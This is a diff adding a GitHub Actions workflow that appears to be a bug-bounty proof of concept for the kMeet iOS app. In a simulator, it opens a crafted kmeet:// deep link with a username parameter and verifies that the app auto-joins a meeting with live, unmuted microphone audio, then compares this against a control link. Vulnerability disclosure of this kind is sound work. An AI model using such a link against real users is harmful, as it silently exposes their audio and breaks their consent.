@@ -1,0 +1,139 @@
+name: iOS kMeet auto-join proof
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  prove:
+    runs-on: macos-15
+    timeout-minutes: 40
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Select Xcode
+        run: |
+          set -euo pipefail
+          sudo xcode-select -s /Applications/Xcode_16.4.app/Contents/Developer
+          xcodebuild -version
+
+      - name: Install browser driver
+        run: |
+          set -euo pipefail
+          npm install --no-save playwright-core@1.56.1
+
+      - name: Build and run the proof
+        env:
+          RESEARCH_USER_AGENT: Infomaniak-YWH-Bugbounty
+        run: |
+          set -euo pipefail
+          mkdir -p proof
+
+          SOURCE_COMMIT="$(git rev-parse HEAD)"
+          RUN_MARKER="${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
+          POSITIVE_ROOM="NaturellSyntheticAudio${RUN_MARKER//-/}"
+          CONTROL_ROOM="NaturellSyntheticControl${RUN_MARKER//-/}"
+
+          RUNTIME="$(xcrun simctl list runtimes -j | jq -r '[.runtimes[] | select(.isAvailable and (.identifier | contains("iOS")))] | sort_by(.version) | last | .identifier')"
+          DEVICE_TYPE="com.apple.CoreSimulator.SimDeviceType.iPhone-16-Pro"
+          UDID="$(xcrun simctl create NaturellKMeetProof "$DEVICE_TYPE" "$RUNTIME")"
+
+          cleanup() {
+            set +e
+            test -n "${RECEIVER_PID:-}" && kill "$RECEIVER_PID" 2>/dev/null
+            test -n "${LOG_PID:-}" && kill "$LOG_PID" 2>/dev/null
+            xcrun simctl shutdown "$UDID" 2>/dev/null
+          }
+          trap cleanup EXIT
+
+          xcrun simctl boot "$UDID"
+          xcrun simctl bootstatus "$UDID" -b
+
+          xcodebuild \
+            -project MeetInfomaniak.xcodeproj \
+            -scheme MeetInfomaniak \
+            -destination "platform=iOS Simulator,id=$UDID" \
+            -derivedDataPath "$PWD/.derived" \
+            CODE_SIGNING_ALLOWED=NO \
+            build | tee proof/xcodebuild.log
+
+          APP_PATH="$(find "$PWD/.derived/Build/Products" -path '*iphonesimulator/MeetInfomaniak.app' -type d -print -quit)"
+          test -n "$APP_PATH"
+          xcrun simctl install "$UDID" "$APP_PATH"
+          xcrun simctl privacy "$UDID" grant microphone com.infomaniak.meet
+
+          xcrun simctl spawn "$UDID" log stream \
+            --style compact \
+            --level info \
+            --predicate 'process == "MeetInfomaniak"' \
+            > proof/app.log 2>&1 &
+          LOG_PID=$!
+
+          node research/receiver.mjs \
+            "$POSITIVE_ROOM" \
+            "$CONTROL_ROOM" \
+            "$RESEARCH_USER_AGENT" \
+            "$PWD/proof" \
+            > proof/receiver.log 2>&1 &
+          RECEIVER_PID=$!
+
+          for _ in $(seq 1 120); do
+            test -f proof/positive-ready.json && break
+            kill -0 "$RECEIVER_PID"
+            sleep 1
+          done
+          test -f proof/positive-ready.json
+
+          POSITIVE_URL="kmeet://kmeet.infomaniak.com/${POSITIVE_ROOM}?username=SyntheticIOS"
+          xcrun simctl openurl "$UDID" "$POSITIVE_URL"
+
+          for _ in $(seq 1 180); do
+            test -f proof/positive-result.json && break
+            kill -0 "$RECEIVER_PID"
+            sleep 1
+          done
+          test -f proof/positive-result.json
+          xcrun simctl io "$UDID" screenshot proof/positive-simulator.png
+
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
+
+          for _ in $(seq 1 120); do
+            test -f proof/control-ready.json && break
+            kill -0 "$RECEIVER_PID"
+            sleep 1
+          done
+          test -f proof/control-ready.json
+
+          CONTROL_URL="kmeet://kmeet.infomaniak.com/${CONTROL_ROOM}"
+          xcrun simctl openurl "$UDID" "$CONTROL_URL"
+          sleep 10
+          xcrun simctl io "$UDID" screenshot proof/control-simulator.png
+
+          wait "$RECEIVER_PID"
+          RECEIVER_PID=""
+
+          jq -n \
+            --arg source_commit "$SOURCE_COMMIT" \
+            --arg app_version "2.10.0" \
+            --arg positive_room "$POSITIVE_ROOM" \
+            --arg control_room "$CONTROL_ROOM" \
+            --arg user_agent "$RESEARCH_USER_AGENT" \
+            --arg simulator_runtime "$RUNTIME" \
+            '{source_commit:$source_commit,app_version:$app_version,positive_room:$positive_room,control_room:$control_room,user_agent:$user_agent,simulator_runtime:$simulator_runtime,synthetic_data_only:true}' \
+            > proof/run-metadata.json
+
+          shasum -a 256 proof/* > proof/SHA256SUMS
+          jq -e '.participant_seen == true and .audio_track_seen == true and .audio_muted == false' proof/positive-result.json
+          jq -e '.participant_seen == false' proof/control-result.json
+
+      - name: Upload proof artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ios-kmeet-autojoin-proof-${{ github.run_id }}-${{ github.run_attempt }}
+          path: proof/
+          if-no-files-found: warn
+          retention-days: 30
